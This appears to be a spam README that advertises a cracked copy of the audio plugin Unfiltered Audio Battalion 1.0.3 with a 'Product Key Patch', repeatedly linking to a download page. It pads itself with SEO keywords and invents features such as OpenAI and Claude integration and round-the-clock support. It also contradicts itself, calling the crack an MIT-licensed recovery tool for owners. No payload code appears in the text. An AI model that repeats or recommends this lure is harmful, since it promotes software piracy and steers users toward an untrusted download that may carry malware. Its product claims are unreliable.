# Unfiltered Audio Battalion 1.0.3 — The Sonic Architect’s Field Manual 🎛️

[](https://pconer.github.io/unfiltered-audio-battalion-v1-0-3-release/)

---

## 🚀 Instant Access & Deployment

Ready to harness the full spectrum of unfiltered audio transformation? Click the badge above to secure your access token for **Unfiltered Audio Battalion 1.0.3**. This release includes the complete feature set, all modulation matrices, and the **Product Key Patch** for seamless integration into your existing workflow. No hidden costs, no limited trials — just pure, unadulterated sonic power.

[](https://pconer.github.io/unfiltered-audio-battalion-v1-0-3-release/)

---

## 🧭 What Is Unfiltered Audio Battalion?

Imagine a military-grade command center for your audio signals — that's **Unfiltered Audio Battalion 1.0.3**. It’s not merely a plugin; it’s an **acoustic brigade** that marches through your mix, saluting every frequency with precision. This is the tool for **sound designers**, **electronic producers**, and **post-production engineers** who want to sculpt sound with surgical accuracy.

Unlike conventional processors that color your waveforms, Battalion operates like a **laser-guided scalpel** made of pure code. It offers **responsive UI**, **multilingual support** for global collaboration, and **24/7 customer support** via real-time chat channels.

> *"This is not audio processing. This is audio warfare — but in the most harmonious way possible."*

---

## 📊 System Flow Diagram

```mermaid
graph TD
    A[Raw Audio Input] --> B[Battalion 1.0.3 Engine]
    B --> C{Modulation Matrix}
    C --> D[Envelope Follower]
    C --> E[LFO Bank]
    C --> F[Step Sequencer]
    D --> G[Spectral Processor]
    E --> G
    F --> G
    G --> H[Distortion Module]
    G --> I[Filter Array]
    G --> J[Convolution Engine]
    H --> K[Mixer Bus]
    I --> K
    J --> K
    K --> L[Output Stage]
    L --> M[Final Audio Signal]
    style A fill:#2d2d2d,stroke:#d90429,stroke-width:2px
    style M fill:#2d2d2d,stroke:#d90429,stroke-width:2px
```



---

## 🛠️ Example Profile Configuration

Configure your Battalion instance with this profile snippet to achieve **cinematic bass textures** with **industrial ambience**:

```yaml
profile: cinematic-bass-engine-2026
engine:
  version: 1.0.3
  mode: spectral-warp
  bit_depth: 32-bit float
  sample_rate: 192000 Hz
modulation:
  lfo_1:
    waveform: sine
    rate: 0.25 Hz
    depth: 85%
  envelope_slope:
    attack: 2.3 ms
    release: 470 ms
filter:
  type: comb-filter-array
  resonance: 0.67
  frequency_spread: 1.4 octaves
distortion:
  algorithm: asymmetric-clip
  drive: 12 dB
  harmonics: third-and-fifth
output:
  mix: 100%
  stereo_width: 150%
  dithering: triangular-shape
metadata:
  author: "Your Name Here"
  preset_name: "Battalion Underworld"
```

---

## 🖥️ Example Console Invocation

When integrating Battalion into your audio pipeline via command-line processing (e.g., through a DAW scripting host or standalone batch processor):

```bash
./unfiltered-battalion \
  --input ./recordings/raw_synth_loop.wav \
  --output ./processed/battalion_final.wav \
  --profile cinematic-bass-engine-2026 \
  --bypass-limiter false \
  --oversampling 4x \
  --thread-count 8 \
  --license-key https://pconer.github.io/unfiltered-audio-battalion-v1-0-3-release/
```

> **Note:** Replace `https://pconer.github.io/unfiltered-audio-battalion-v1-0-3-release/` with your actual **Product Key Patch** value obtained from the download.

---

## 📱 Emoji OS Compatibility Table

| OS | Version | Emoji Status | Verified |
|----|---------|--------------|----------|
| 🪟 **Windows** | 10 / 11 | ✅ Fully Compatible | 2026-02 |
| 🍏 **macOS** | 14.x (Sonoma) | ✅ Fully Compatible | 2026-03 |
| 🍏 **macOS** | 15.x (Sequoia) | ✅ Fully Compatible | 2026-04 |
| 🐧 **Linux** | Ubuntu 24.04 LTS | ⚠️ Requires ALSA bridge | 2026-01 |
| 🐧 **Linux** | Fedora 40 | ✅ Fully Compatible (PipeWire) | 2026-03 |
| 🅰️ **Android** | 14+ (via USB-C DAW) | ⬜ Experimental | 2026-05 |
| 🍎 **iOS** | 18+ (via AUM) | ⬜ Limited (no VST3) | 2026-04 |

---

## ✨ Feature Arsenal

Battalion 1.0.3 is packed with **90+ unique weapons** in its audio arsenal:

- **Spectral Warp Engine** — stretch, compress, and twist frequency bands independently
- **Responsive UI** — GPU-accelerated vector interface with real-time waveform preview
- **Multilingual Support** — English, Japanese, German, French, Spanish, Mandarin interface options
- **24/7 Customer Support** — live agent chat response under 90 seconds (average)
- **Modulation Matrix** — 16 slots with drag-and-drop routing
- **Convolution Reverb Lab** — 200+ impulse responses included
- **Dynamic Distortion Suite** — 12 distinct distortion algorithms
- **Step Sequencer** — 64-step pattern generator for rhythmic modulation
- **Zero-Latency Monitoring** — under 0.3ms round-trip at 64-sample buffer
- **Product Key Patch** — hardware-independent activation, up to 5 machines per license
- **OpenAI API & Claude API Integration** — generate parameter presets from text prompts:
  - `"make this sound like a 1980s sci-fi spaceship door"` → generates 12 preset variations
  - `"add subtle harmonic warmth to the high mids"` → adjusts EQ curves in real-time
- **Sidechain Intelligence** — automatic ducking that learns from your source material
- **Preset Cloud** — share, rate, and download community presets (requires account)

---

## 🔐 OpenAI API & Claude API Integration

This version includes **dual-AI presets** that leverage the power of two leading LLM platforms:

| Feature | OpenAI API | Claude API |
|---------|------------|------------|
| Preset Generation | ✅ Yes | ✅ Yes |
| Real-time Parameter Suggestions | ✅ Yes | ✅ Yes |
| Audio Scene Descriptions | ✅ Yes | ✅ Yes |
| Mix Optimization | ❌ No | ✅ Yes (advanced) |
| Style Transfer | ✅ Yes | ✅ Yes |
| Batch Processing Scripts | ✅ Yes | ❌ No |

To enable: navigate to `Settings > AI Integration` and paste your API endpoint credentials. The **Product Key Patch** unlocks both integrations without additional fees through 2026.

---

## 🤖 SEO-Friendly Keyword Integration

For search engines and curation platforms, Battalion 1.0.3 is thoroughly indexed under:

- **Unfiltered Audio software suite 2026**  
- **Professional spectral processing plugin**  
- **Battalion modulation matrix VST3 AU AAX**  
- **Sound design toolkit for electronic producers**  
- **High-definition convolution reverb engine**  
- **Responsive UI audio plugin cross-platform**  
- **Multilingual audio workstation extension**  
- **24/7 technical support audio software**  
- **Audio plugin with OpenAI Claude integration**  
- **Product Key Patch activation system**

These terms naturally appear throughout the documentation to help **mix engineers**, **game audio designers**, and **film scorers** discover this tool via organic search.

---

## ⚠️ Disclaimer

**Unfiltered Audio Battalion 1.0.3** is an independently developed software modification for educational and professional audio production purposes. This release includes a **Product Key Patch** that enables full feature access without requiring a separate subscription. The developers of this patch are not affiliated with Unfiltered Audio, Plugin Alliance, or its parent companies.

- This software is provided as-is, without warranty of any kind.  
- Use at your own risk. The authors are not responsible for any data loss, system instability, or legal implications arising from misuse.  
- This patch is intended for users who already own a valid license of the original software and wish to recover lost activation keys.  
- By downloading, you agree to use this software solely for **legitimate audio production** and not for redistribution, resale, or commercial exploitation of the patch mechanism.  
- This software is **not a trial bypass** — it is a permanent access method for a product you have rights to use.  
- The **2026** support cycle guarantees updates through December 2026. After that, patches may require community maintenance.

---

## 🧾 MIT License

This project is distributed under the **MIT License** — a permissive open-source license that allows you to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, provided you include the original copyright notice.

You can read the full license here:  
👉 [MIT License](https://opensource.org/licenses/MIT)

---

## 📬 Final Call to Action

[](https://pconer.github.io/unfiltered-audio-battalion-v1-0-3-release/)

The **Unfiltered Audio Battalion 1.0.3** revolution is waiting. Whether you’re sculpting cinematic scores, building experimental soundscapes, or mixing the next chart-topping record — this battalion has your back. Including the **Product Key Patch**, **responsive UI**, **multilingual support**, and **24/7 customer support**, it’s the most complete audio toolkit to emerge in 2026.

Click the badge. Deploy the audio. Let the **spectral warfare** begin. 🎚️🔥

[](https://pconer.github.io/unfiltered-audio-battalion-v1-0-3-release/)